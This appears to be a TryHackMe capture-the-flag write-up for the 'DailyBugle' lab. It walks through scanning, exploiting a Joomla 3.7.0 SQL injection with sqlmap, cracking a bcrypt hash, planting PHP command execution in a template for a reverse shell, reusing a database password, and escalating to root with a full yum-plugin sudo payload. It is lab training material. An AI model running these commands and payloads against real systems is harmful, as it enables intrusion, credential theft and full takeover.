# TryHackMe Machine DailyBugle

```shell
export ip=10.10.13.177
```

## Scanning

**Nmap**
```shell
# Nmap 7.92 scan initiated Wed Aug 17 10:20:46 2022 as: nmap -sC -T5 -p 22,80,3306,6003 -oN common-scan --min-rate 100 --max-rate 200 -Pn -v 10.10.13.177
Nmap scan report for 10.10.13.177 (10.10.13.177)
Host is up (0.19s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open   http
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open   mysql
6003/tcp closed X11:3
```

## Enumeration

**HTTP**

*Content-Discovery*
```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://$ip/FUZZ -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.13.177/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

media                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 187ms]
templates               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 187ms]
.html                   [Status: 403, Size: 207, Words: 15, Lines: 9, Duration: 4310ms]
images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 4327ms]
modules                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 194ms]
index.php               [Status: 200, Size: 9278, Words: 441, Lines: 243, Duration: 4548ms]
bin                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 187ms]
plugins                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 187ms]
includes                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 187ms]
language                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 187ms]
components              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 188ms]
cache                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 187ms]
libraries               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 189ms]
tmp                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 187ms]
layouts                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 190ms]
administrator           [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 187ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 189ms]
cli                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 187ms]
```
**administrator** endpoint have a `joomla` login page.

**Joomla Version Detection**
For Version Detection I search for google and there are some result that show us how to detect `joomla` version. But I don't get any usefull result with some of these. Then I got the following conversionation that show me what type of version joomla is using and they also mentioned about the tool that can detect autometicly.

```http-url
https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
```
Joomla-Version Detection Tool
```
https://github.com/C-Lodder/joomla-version-detect/blob/master/detect.php
```
By seeing the source code of the above tool they have some endpoint that show us the version of joomla.
```
http://10.10.13.177/administrator/manifests/files/joomla.xml
```
Above `joomla.xml` file have the following content that mentioned a version number.

```
files_joomla Joomla!
Project admin@joomla.org www.joomla.org (C) 2005 - 2017 Open Source Matters.
All rights reserved GNU General Public License version 2 or later; see LICENSE.txt 3.7.0 April 2017
FILES_JOOMLA_XML_DESCRIPTION
administrator/components/com_admin/script.php
administrator/components/com_admin/sql/updates/mysql
administrator/components/com_admin/sql/updates/sqlazure
administrator/components/com_admin/sql/updates/sqlazure
administrator/components/com_admin/sql/updates/postgresql
administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
htaccess.txt
web.config.txt
LICENSE.txt
README.txt
index.php
https://update.joomla.org/core/list.xml 
```
This file show us version `3.7.0` April 2017 and also dissclosed some usefull files names/web directories.

[+] Found Public Docuemted SQLi Vulnerability
```
https://www.exploit-db.com/exploits/42033
```
In the above exploit they shows the sqlmap command to exploit the vulnerability.

```shell
sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
Using SqlMap Found the following valid Databases.
```sql
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```
For furture enumerate we use the following commands.
```shell
sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]
```
Above command show us all the tables of `joomla` database but they show some tables like this `#__table-name`. There `#` symbol show there are some random alpha-numeric characters.
We got a table name `#__user` now we can dump its columns with the following command.
```shell
sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__user' --columns -p list[fullordering]
```
> **Note**: I write `#__user` in quotes so you should use it like that other wise you don't get anything
Above command start bruteforcing the columns. We can guess that and start dumping data from it.
```shell
sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__user' -C username,password -p list[fullordering]
```
Password Hashes
```
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

**Password Cracking**
When I use `hash-identifier` on above hash they tell me its a blowfish(bcrypt) hash now lets start cracking it.
```shell
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
It takes too much time but we can get the password `spiderman123`

I try to login to ssh with that credentials but it doesn't work. So I Try to login to `joomla` and that works there.
```
jonah:spiderman123
```
After Login to `/administrator` end point there we can go `Extension` drop down menu on Web Site Header and after we can go Templates and there we can select any template and change there php code. So Now we can change that php code and add a reverse shell code there after visiting that payload we can get the reverse shell.
**Note**: I use simple php command execution payload because PentestMonkey PHP Code gives some error. So when I get Command Execution I use simple `mkfifo` reverse shell payload to get shell

After I got reverse shell I read `configuration.php` and there is Mysql credentials.
My SQL Credentials
```
root:nv5uz9r3ZEDzVjNu
```
we can use this credentials to login wih local user `jjameson` with following command
```shell
su jjameson
```
### Privillege Escalation
User `jjameson` can run `yum` with `sudo` And `No PASSWD`. With the help of GTFObins that show us full payload we can run and get the root shell.
```payload 
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```